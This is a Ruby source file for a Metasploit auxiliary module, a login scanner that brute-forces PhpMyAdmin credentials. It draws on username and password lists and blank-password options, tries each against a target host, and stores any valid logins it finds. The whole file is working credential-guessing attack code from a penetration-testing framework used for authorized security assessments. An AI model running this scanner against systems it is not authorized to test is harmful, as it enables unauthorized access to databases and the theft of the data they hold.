##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/login_scanner/phpmyadmin'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'PhpMyAdmin Login Scanner',
      'Description' => %q{
        This module will attempt to authenticate to PhpMyAdmin.
      },
      'Author'      => [ 'Shelby Pace' ],
      'License'     => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'RPORT'      => 80,
          'USERNAME'   => 'root'
        }
    ))

    register_options(
      [
        OptString.new('USERNAME', [true, 'The username to PhpMyAdmin', 'root']),
        OptString.new('PASSWORD', [false, 'The password to PhpMyAdmin', '']),
        OptString.new('TARGETURI', [true, 'The path to PhpMyAdmin', '/index.php'])
      ])

    deregister_options('PASSWORD_SPRAY')
  end

  def scanner(ip)
    @scanner ||= lambda {
      cred_collection = Metasploit::Framework::CredentialCollection.new(
        blank_passwords: datastore['BLANK_PASSWORDS'],
        pass_file:       datastore['PASS_FILE'],
        password:        datastore['PASSWORD'],
        user_file:       datastore['USER_FILE'],
        userpass_file:   datastore['USERPASS_FILE'],
        username:        datastore['USERNAME'],
        user_as_pass:    datastore['USER_AS_PASS']
      )

      return Metasploit::Framework::LoginScanner::PhpMyAdmin.new(
        configure_http_login_scanner(
          host: ip,
          port: datastore['RPORT'],
          cred_details:       cred_collection,
          stop_on_success:    datastore['STOP_ON_SUCCESS'],
          bruteforce_speed:   datastore['BRUTEFORCE_SPEED'],
          uri: normalize_uri(datastore['TARGETURI']),
          connection_timeout: 5
        ))
      }.call
  end

  def report_bad_cred(ip, rport, result)
    invalidate_login(
      address: ip,
      port: rport,
      protocol: 'tcp',
      public: result.credential.public,
      private: result.credential.private,
      realm_key: result.credential.realm_key,
      realm_value: result.credential.realm,
      status: result.status,
      proof: result.proof
    )
  end

  def run_host(ip)
    phpmyadmin_res = scanner(ip).check_setup
    unless phpmyadmin_res
      print_brute(:level => :error, :ip => ip, :msg => "PhpMyAdmin is not available")
      return
    end

    print_status("PhpMyAdmin Version: #{phpmyadmin_res}")

    scanner(ip).scan! do |result|
        case result.status
        when Metasploit::Model::Login::Status::SUCCESSFUL
          print_brute(:level => :good, :ip => ip, :msg => "Success: '#{result.credential}'")
          store_valid_credential(
            user: result.credential.public,
            private: result.credential.private,
            private_type: :password,
            proof: result.proof,
            service_data: {
              address: ip,
              port: rport,
              service_name: 'http',
              protocol: 'tcp',
              workspace_id: myworkspace_id
            }
          )
        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
          vprint_brute(:level => :verror, :ip => ip, :msg => result.proof)
          report_bad_cred(ip, rport, result)
        when Metasploit::Model::Login::Status::INCORRECT
          vprint_brute(:level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'")
          report_bad_cred(ip, rport, result)
        end
    end
  end
end
